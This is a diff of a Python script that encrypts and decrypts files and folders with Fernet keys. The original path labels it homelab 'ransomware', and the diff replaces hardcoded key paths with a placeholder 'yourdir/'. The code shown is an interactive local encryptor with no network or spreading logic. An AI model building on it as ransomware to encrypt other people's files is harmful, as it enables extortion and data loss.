@@ -58,7 +58,7 @@ def encrypt(path_type):
             elif os.path.isfile(path1):
                 key = Fernet.generate_key()
                 keyname = input("Enter the key's name: ")
-                with open(f'/home/homelab/Tools/Malware/ransomware/key/{keyname}.key', 'wb') as thekey:
+                with open(f'yourdir/{keyname}.key', 'wb') as thekey:
                     thekey.write(key)
 
                 with open(path1, 'rb') as thefile:
@@ -88,7 +88,7 @@ def encrypt(path_type):
                 elif os.listdir(path2):
                     key = Fernet.generate_key()
                     keyname = input("Enter the key's name: ")
-                    with open(f'/home/homelab/Tools/Malware/ransomware/key/{keyname}.key', 'wb') as thekey:
+                    with open(f'yourdir/{keyname}.key', 'wb') as thekey:
                         thekey.write(key)
 
                     for file in os.listdir(path2):
@@ -128,7 +128,7 @@ def decrypt(path_type):
                 print('The file is empty')
             elif os.path.isfile(path1):
                 keyname = input("Enter the key's name: ")
-                with open(f'/home/homelab/Tools/Malware/ransomware/key/{keyname}.key', 'rb') as key:
+                with open(f'yourdir/{keyname}.key', 'rb') as key:
                     secretkey = key.read()
                 with open(path1, 'rb') as thefile:
                     content = thefile.read()
@@ -138,7 +138,7 @@ def decrypt(path_type):
                     print('Wrong key')
                 with open(path1, 'wb') as thefile:
                     thefile.write(content_decryted)
-                os.remove(f'/home/homelab/Tools/Malware/ransomware/key/{keyname}.key')
+                os.remove(f'yourdir/{keyname}.key')
                 print('File decrypted!')
             else:
                 print('Wrong path')
@@ -159,7 +159,7 @@ def decrypt(path_type):
                     print('The folder is empty')
                 elif os.listdir(path2):
                     keyname = input("Enter the key's name: ")
-                    with open(f'/home/homelab/Tools/Malware/ransomware/key/{keyname}.key', 'rb') as key:
+                    with open(f'yourdir/{keyname}.key', 'rb') as key:
                         secretkey = key.read()
 
                     for file in os.listdir(path2):
@@ -178,7 +178,7 @@ def decrypt(path_type):
                                 print('Wrong key')
                             with open(file_path, 'wb') as thefile:
                                 thefile.write(contents_decryted)
-                            os.remove(f'/home/homelab/Tools/Malware/ransomware/key/{keyname}.key')
+                            os.remove(f'yourdir/{keyname}.key')
                             print('Folder decrypted!')
             else:
                 print('Wrong path')
@@ -186,7 +186,7 @@ def decrypt(path_type):
             print('Wrong path')
 
     else:
-        os.remove('/home/homelab/Tools/Malware/ransomware/key/thekey.key')
+        os.remove('yourdir/thekey.key')
         print("We can't handle your situation please try again")
 
 def main():
